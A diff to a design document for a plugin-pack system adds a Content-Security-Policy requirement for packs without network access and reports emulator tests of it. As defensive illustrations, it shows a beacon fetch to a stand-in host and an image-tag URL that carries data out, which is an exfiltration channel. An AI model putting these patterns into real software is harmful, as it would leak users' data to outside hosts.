@@ -126,6 +126,32 @@ repository.
 - Claim a contract the host does not implement. `contractVersion` and `minimumHostVersion` produce a
   sentence a person can act on, not a crash at the first missing method.
 - Arrive without a signature. An unsigned or damaged pack is refused whole; the installed version stays.
+- Reach the network it did not declare. A pack without the `network` capability must ship a
+  Content-Security-Policy of its own with `default-src 'self'` and `connect-src 'none'` (or `'self'`,
+  which Loro needs to fetch its own `.wasm`). The install refuses it otherwise.
+
+## The one capability a policy can enforce
+
+`network` was described as advisory for a year on the reasoning that the host cannot stop a same-origin pack
+from calling `fetch`. That was true and beside the point: **a document's own CSP is enforced by the browser
+whatever origin it shares.** So the host does not have to block the request — it refuses to install a pack
+that has not blocked it for itself, and because every file is hash-checked against the manifest, what was
+checked at install is what runs.
+
+Measured on the emulator:
+
+| Check                                                      | Result                                                                                                |
+| ---------------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
+| `fetch('./manifest.json')` from inside the pack            | **200** — same-origin, which is how the wasm loads                                                    |
+| `fetch('https://example.com/beacon')` from inside the pack | refused, with `securitypolicyviolation` naming `violatedDirective: "connect-src"` and the blocked URI |
+
+Two details that cost time and are worth keeping:
+
+- **`connect-src 'none'` blanks the frame for a Loro pack.** wasm-bindgen loads its `.wasm` with `fetch()`,
+  and that is same-origin traffic. `'self'` is the correct value: it permits the pack's own assets and
+  cannot reach a remote origin.
+- **`default-src` is not optional.** The other fetch directives inherit from it, so without it
+  `<img src="https://elsewhere/?d=…">` is an exfiltration channel that `connect-src` never sees.
 
 ## Still open
 
